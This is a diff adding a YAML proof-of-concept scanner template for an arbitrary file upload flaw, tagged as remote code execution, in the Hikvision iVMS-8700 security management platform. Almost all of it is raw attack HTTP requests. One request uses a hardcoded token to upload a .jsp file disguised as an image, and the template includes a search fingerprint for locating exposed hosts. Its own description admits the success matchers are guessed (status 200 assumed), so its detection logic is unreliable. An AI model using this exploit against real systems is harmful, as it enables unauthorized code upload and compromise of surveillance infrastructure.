@@ -1,0 +1,67 @@
+id: poc-c36bebad1ace13123dd6
+info:
+  name: 海康威视iVMS-8700综合安防系统resourceOperations任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c36bebad1ace13123dd6479b501cf161
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: c36bebad1ace13123dd6479b501cf161
+    fofa: + hunter：`web.body="/views/home/file/installPackage.rar"`
+http:
+- raw:
+  - 'POST /eps/api/resourceOperations/upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
+
+    Cache-Control:max-age=0
+
+    Connection:close
+
+    Content-Length: 52
+
+
+    service=http://xx.xx.xx.xx/home/index.action'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /eps/api/resourceOperations/upload?token=DFB0D4034A82263A4DA9A37EB0DA687B HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Language:zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryGEJwjlojPo
+
+    Cache-Control:max-age=0
+
+    Connection:close
+
+    Content-Length: 178
+
+
+    ------WebKitFormBoundaryGEJwjlojPo
+
+    Content-Disposition: form-data;name="fileUploader"; filename="test.jsp"
+
+    Content-Type: image/jpeg
+
+
+    1
+
+    ------WebKitFormBoundaryGEJwjlojPo--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
